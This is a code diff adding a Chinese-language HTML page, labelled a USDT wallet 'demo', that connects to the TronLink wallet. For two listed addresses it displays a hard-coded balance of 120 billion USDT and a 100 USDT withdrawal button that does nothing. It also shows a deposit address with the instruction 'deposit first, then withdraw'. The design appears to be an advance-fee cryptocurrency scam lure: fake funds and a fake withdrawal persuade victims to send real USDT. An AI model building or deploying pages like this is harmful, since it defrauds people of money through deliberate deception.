@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+  <title>USDT 虚拟钱包 Demo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <style>
+    body { font-family: sans-serif; padding: 20px; max-width: 480px; margin: auto; }
+    .card { border: 1px solid #ddd; border-radius: 8px; padding: 16px; box-shadow:0 2px 6px rgba(0,0,0,.05); }
+    .row { margin-bottom: 12px; }
+    .label { color: #666; font-size:0.95em; }
+    .value { font-size: 1.2em; word-break: break-all; }
+    .mono { font-family: monospace; font-size:0.95em; }
+    button { width: 100%; padding: 10px; border:none; background:#4A5568; color:#fff; border-radius:4px; font-size:1em; cursor:pointer; }
+    button:disabled { background:#aaa; cursor:not-allowed; }
+    #msg { margin-top:12px; color:#c00; min-height:1.2em; }
+    #mobileNotice { display:none; background:#ffeaea; color:#c00; padding:10px; border-radius:6px; margin-bottom:15px; font-size:0.95em; text-align:center; }
+  </style>
+</head>
+<body>
+  <div id="mobileNotice">⚠️ 请在 TronLink App 内的浏览器中打开此页面并点击“连接钱包”。</div>
+  <div class="card">
+    <div class="row"><div class="label">钱包地址：</div><div id="addr" class="value">未连接</div></div>
+    <div class="row"><div class="label">账户余额：</div><div id="bal" class="value">--</div></div>
+    <div class="row"><div class="label">本次可提：</div><div class="value">100 USDT</div></div>
+    <div class="row"><div class="label">充值地址（先充后提）：</div><div class="value mono">TLUT4CwHpcSgQWnEiM9FmyZR76nTRVNSne</div></div>
+    <p style="color:#666;font-size:0.9em;line-height:1.4;">
+      以下两个地址可提现：<br/>
+      1. TFcpXGJVourvwxCnMYfR6D5nwFcVzWxdfc<br/>
+      2. TNiJWUJzPPCQaGwTFoeabqhDEuh6NLvBxF
+    </p>
+    <button id="btn">连接钱包</button>
+    <div id="msg"></div>
+  </div>
+
+<script>
+const ALLOWED_USERS=['TFcpXGJVourvwxCnMYfR6D5nwFcVzWxdfc','TNiJWUJzPPCQaGwTFoeabqhDEuh6NLvBxF'];
+const STATIC_BAL='120,000,000,000 USDT';
+function detectMobile(){if(/iphone|android|ipad|micromessenger/i.test(navigator.userAgent)){document.getElementById('mobileNotice').style.display='block';}}
+async function connectWallet(){if(window.tronLink&&window.tronLink.request){try{await window.tronLink.request({method:'tron_requestAccounts'});}catch(e){document.getElementById('msg').innerText='用户拒绝授权';return;}}init();}
+function setDisconnected(){document.getElementById('addr').innerText='未连接';document.getElementById('bal').innerText='--';document.getElementById('btn').innerText='连接钱包';document.getElementById('btn').disabled=false;document.getElementById('btn').onclick=connectWallet;}
+function init(){detectMobile();if(window.tronWeb&&window.tronWeb.ready){const addr=window.tronWeb.defaultAddress.base58;document.getElementById('addr').innerText=addr;if(ALLOWED_USERS.includes(addr)){document.getElementById('bal').innerText=STATIC_BAL;document.getElementById('btn').innerText='提现 100 USDT';document.getElementById('btn').disabled=false;document.getElementById('btn').onclick=()=>document.getElementById('msg').innerText='演示页面：未连真实合约';}else{document.getElementById('btn').innerText='当前地址不可提现';document.getElementById('btn').disabled=true;document.getElementById('msg').innerText='请切换到授权钱包地址';}}else{setDisconnected();}}
+document.addEventListener('DOMContentLoaded',init);
+</script>
+</body>
+</html>
